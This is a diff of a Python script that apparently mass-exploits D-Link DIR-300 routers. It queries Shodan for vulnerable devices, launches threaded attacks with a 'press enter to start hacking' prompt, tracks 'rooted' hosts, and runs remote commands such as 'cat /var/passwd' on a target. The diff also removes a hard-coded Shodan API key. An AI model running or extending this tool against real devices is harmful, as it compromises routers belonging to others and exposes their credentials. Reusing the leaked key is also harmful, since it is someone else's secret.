@@ -24,8 +24,7 @@ from shodan import WebAPI
 from sys import argv, stdout
 from base64 import encodestring
 
-SHODAN_API_KEY = None
-SHODAN_API_KEY = "Wtzt1oyksFcL0NxQOGI3lpnnMiFNLKJ5"
+SHODAN_API_KEY = None # Don't bother to register and get it.
 rooted = []
 
 
@@ -174,8 +173,9 @@ if __name__ == '__main__':
     if len(argv) == 1:
         print('No args found, try to query Shodan...')
         if SHODAN_API_KEY is None:
-        	print('Go and get SHODAN_API_KEY at http://www.shodanhq.com/')
-        	
+            print('Go and get SHODAN_API_KEY at http://www.shodanhq.com/')
+            exit()
+
         api = WebAPI(SHODAN_API_KEY)
         search_queries = ['Server: Linux, HTTP/1.1, DIR','Mathopd/1.5p6' ]#, 'Server: Linux, HTTP/1.1, DIR-300']
         for query in search_queries:
@@ -187,8 +187,8 @@ if __name__ == '__main__':
                 results = api.search(query) 
                 if total == 0:
                     total = int(results['total'])
-                    print 'Results found: %s' % results['total']
-                    print 'Countries found: '
+                    print('Results found: %s' % results['total'])
+                    print('Countries found: ')
                     pprint(results['countries'])
                     raw_input('press enter to start hacking')
                 dm = DlinkManager(results['matches'],thread_count=10)
@@ -205,9 +205,6 @@ if __name__ == '__main__':
         if len(argv) > 2:
             port = int(argv[2])
         d = Dir300(argv[1],port)
-        print "INFO:"
-        print d.info
-        print "FIRMWARE"
-        print d.firmware
-        print d.command('cat /var/passwd')
-        print d.command_blind('cat /var/passwd')
+        print("INFO: %s\nFIRMWARE: %s\n" % (d.info, d.firmware))
+        print(d.command('cat /var/passwd'))
+        print(d.command_blind('cat /var/passwd'))
